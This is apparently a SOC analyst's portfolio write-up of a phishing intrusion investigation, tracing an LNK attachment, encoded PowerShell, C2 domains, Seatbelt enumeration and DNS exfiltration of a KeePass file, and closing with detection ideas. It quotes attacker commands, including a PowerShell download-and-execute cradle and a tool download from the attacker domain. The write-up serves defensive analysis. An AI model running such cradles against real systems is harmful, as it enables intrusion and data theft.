## Scenario Overview

This investigation analyses a phishing-based compromise that resulted in malicious PowerShell execution, attacker-controlled activity, and data exfiltration from a Windows workstation.

The attack began with a phishing email containing an encrypted attachment. Once executed, the attachment launched an encoded PowerShell command that established communication with attacker-controlled infrastructure and initiated a series of malicious activities on the victim machine.

Using PowerShell logs, packet capture analysis, and email artefacts, the investigation reconstructed the attacker’s actions, including tool downloads, system enumeration, sensitive file access, and outbound data transfers.

The objective of this investigation was to identify how the compromise occurred, trace the attacker’s activity across the system and network, and determine the overall impact of the intrusion.

##  Investigation Flow
## Initial Access (Phishing Email Execution Chain)

The intrusion began with a phishing email delivered to the victim’s mailbox. The email contained a malicious attachment (invoice.zip) encrypted and disguised to bypass basic email filtering and appear legitimate while executing hidden commands upon interaction.

Evidence: Phishing Email ![phishmail.png](https://github.com/KAIGAI-BRIAN/SOC-Analyst-Portfolio/blob/main/PowerShell-Based%20Phishing%20Intrusion%20%26%20Data%20Exfiltration%20Investigation/screenshots/phishmail.png)

The file inside invoice.zip was a malicious LNK file that functioned as the execution trigger, initiating PowerShell-based payload delivery once the attachment was opened.

Evidence: ![lnkparseresults.png](https://github.com/KAIGAI-BRIAN/SOC-Analyst-Portfolio/blob/main/PowerShell-Based%20Phishing%20Intrusion%20%26%20Data%20Exfiltration%20Investigation/screenshots/lnkparseresults.png)

Initial Access Summary:
The phishing email delivered a malicious attachment which, upon execution, triggered a LNK-based launcher that initiated an encoded PowerShell command, marking the start of endpoint compromise.

## PowerShell Execution Analysis

Encoded Command ![powershell enc.png](https://github.com/KAIGAI-BRIAN/SOC-Analyst-Portfolio/blob/main/PowerShell-Based%20Phishing%20Intrusion%20%26%20Data%20Exfiltration%20Investigation/screenshots/powershell%20enc.png)

This is a Base64-encoded PowerShell command using:

-nop → No Profile (avoids user scripts)
-windowstyle hidden → hides execution window
-enc → encoded command (obfuscation)

This is a classic execution evasion technique used in phishing-based attacks.

## Decoded Payload

When decoded, the Base64 string becomes:

iex (new-object net.webclient).downloadstring('http://files[.]bpakcaging[.]xyz/update')
Breakdown:
iex
Short for Invoke-Expression — executes whatever is returned.
new-object net.webclient
Creates a web client object used for network communication.
downloadstring()
Downloads content from a remote server.
Remote URL
http://files.[]bpakcaging[.]xyz/update
This is the attacker-controlled infrastructure used to fetch a second-stage payload.

##  Attack Behaviour Classification

✔ Living-off-the-land technique
Using built-in PowerShell tools instead of malware binaries.

✔ Remote payload execution (fileless)
No file is saved — code executes directly in memory.

✔ Stage 1 loader
This is NOT the final payload — it retrieves additional malicious code.

Summary

The encoded PowerShell command indicates an attempt to execute a hidden script that retrieves and runs additional malicious content from an external attacker-controlled domain. The use of encoded execution parameters and hidden window style strongly suggests deliberate obfuscation to evade detection.

## Attacker Activity Analysis

Initial analysis confirmed that the malicious attachment led to execution of a PowerShell command on the compromised workstation, establishing the initial foothold.

The decoded payload identified the starting point of endpoint-level activity and provided the first indicator of attacker-controlled execution.

Following this, PowerShell operational logs were analysed to determine the scope and impact of the intrusion. The investigation focused on identifying the execution of the decoded payload and correlating it with subsequent malicious activity observed on the host.

Since the logs were structured in JSON format, they were parsed using jq, a lightweight command-line JSON processor, to enable efficient filtering and analysis of relevant events.

Analysis of PowerShell logs began with the domain identified in the decoded payload to reconstruct attacker behaviour and extent of compromise.

## Attacker Infrastructure Discovery

Analysis of the PowerShell logs revealed communication with multiple attacker-controlled domains used for payload hosting and command-and-control (C2) activity.

C2Domains ![c2domains.png](https://github.com/KAIGAI-BRIAN/SOC-Analyst-Portfolio/blob/main/PowerShell-Based%20Phishing%20Intrusion%20%26%20Data%20Exfiltration%20Investigation/screenshots/c2domains.png)

Identified Domains:
Domain	Purpose
files.bpakcaging.xyz	Payload hosting and tool delivery
cdn.bpakcaging.xyz	Command-and-control communication

The malicious PowerShell commands showed repeated outbound HTTP requests to these domains, including remote script execution and payload retrieval activity.

## Enumeration Activity

Further analysis revealed that the attacker downloaded and executed Seatbelt, a well-known Windows enumeration tool commonly used for post-exploitation reconnaissance.

Evidence: ![sb.png](https://github.com/KAIGAI-BRIAN/SOC-Analyst-Portfolio/blob/main/PowerShell-Based%20Phishing%20Intrusion%20%26%20Data%20Exfiltration%20Investigation/screenshots/sb.png)

The tool was retrieved from attacker-controlled infrastructure using PowerShell web requests: iwr http://files[.]bpakcaging[.]xyz/sb.exe -outfile sb.exe

This activity suggests the attacker was attempting to gather system and environment information following initial compromise.

## Sensitive File Access

PowerShell logs showed the attacker downloading and executing sq3.exe, a SQLite database interaction utility.

Evidence: ![sqswnld.png](https://github.com/KAIGAI-BRIAN/SOC-Analyst-Portfolio/blob/main/PowerShell-Based%20Phishing%20Intrusion%20%26%20Data%20Exfiltration%20Investigation/screenshots/sq3dwnld.png)

The tool was used to access a SQLite database associated with Microsoft Sticky Notes.

Associated command observed:

This indicates the attacker was attempting to extract locally stored user information from the Sticky Notes application database.
Evidence: ![sq3.png](https://github.com/KAIGAI-BRIAN/SOC-Analyst-Portfolio/blob/main/PowerShell-Based%20Phishing%20Intrusion%20%26%20Data%20Exfiltration%20Investigation/screenshots/sq3.png)

## Data Exfiltration Activity

Analysis of PowerShell telemetry identified attempted exfiltration of a sensitive KeePass password database file: **protected_data.kdbx**

The attacker used PowerShell to read the file contents into memory before converting the data into hexadecimal format for outbound transmission.

Observed commands indicated the use of nslookup to transmit encoded data through DNS queries:

Evidence: ![exfil.png](https://github.com/KAIGAI-BRIAN/SOC-Analyst-Portfolio/blob/main/PowerShell-Based%20Phishing%20Intrusion%20%26%20Data%20Exfiltration%20Investigation/screenshots/exfil.png)

This behaviour is consistent with DNS-based data exfiltration techniques designed to bypass traditional network monitoring controls.

## MITRE ATT&CK Mapping
| Tactic            | Technique                    | MITRE ATT&CK ID |
|-------------------|------------------------------|-----------------|
| Initial Access    | Phishing                     | T1566.001       |
| Execution         | PowerShell                   | T1059.001       |
| Defense Evasion   | Obfuscation                  | T1027           |
| Defense Evasion   | Hidden Window                | T1564.003       |
| Command & Control | Ingress Tool Transfer        | T1105           |
| Discovery         | System Information Discovery | T1082           |
| Collection        | Data from Local System       | T1005           |
| Exfiltration      | DNS Exfiltration             | T1048           |

## Detection
## PowerShell Monitoring
Detect encoded PowerShell (-enc)
Detect Invoke-Expression (iex) usage
Alert on hidden PowerShell windows

## Network Monitoring
Flag suspicious domains (e.g. *.bpakcaging.xyz)
Monitor PowerShell outbound HTTP traffic
Detect unusual DNS query patterns

## Endpoint Monitoring
Detect execution of tools like Seatbelt
Monitor execution from user-writable directories
Alert on database access (SQLite / KeePass files)

## Exfiltration Detection
Detect DNS tunneling behavior
Monitor high-volume structured DNS queries
Correlate file access followed by outbound traffic

